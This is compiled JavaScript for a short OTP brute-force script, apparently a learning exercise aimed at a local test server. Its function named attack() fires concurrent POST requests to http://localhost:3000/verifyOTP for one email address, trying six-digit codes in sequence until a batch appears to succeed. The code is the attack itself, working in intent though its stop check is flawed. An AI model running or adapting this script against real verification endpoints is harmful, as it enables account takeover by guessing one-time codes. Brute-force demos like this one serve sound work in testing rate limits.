"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const axios_1 = __importDefault(require("axios"));
function sendRequest(otp) {
    return __awaiter(this, void 0, void 0, function* () {
        let data = JSON.stringify({
            email: "raj@email.com",
            userOTP: otp,
        });
        let config = {
            method: "post",
            maxBodyLength: Infinity,
            url: "http://localhost:3000/verifyOTP",
            headers: {
                "Content-Type": "application/json",
            },
            data: data,
        };
        try {
            const response = yield axios_1.default.request(config);
            console.log(JSON.stringify(response.data));
            return true;
        }
        catch (error) {
            console.log("Some error happened");
        }
    });
}
function attack() {
    return __awaiter(this, void 0, void 0, function* () {
        const p = [];
        for (let i = 100000; i < 200000; i += 100) {
            for (let j = 1; j < 100; j++) {
                const otp = (i + j).toString();
                p.push(sendRequest(otp));
            }
            const res = yield Promise.all(p);
            if (res) {
                console.log("OTP found");
                break;
            }
        }
    });
}
attack();
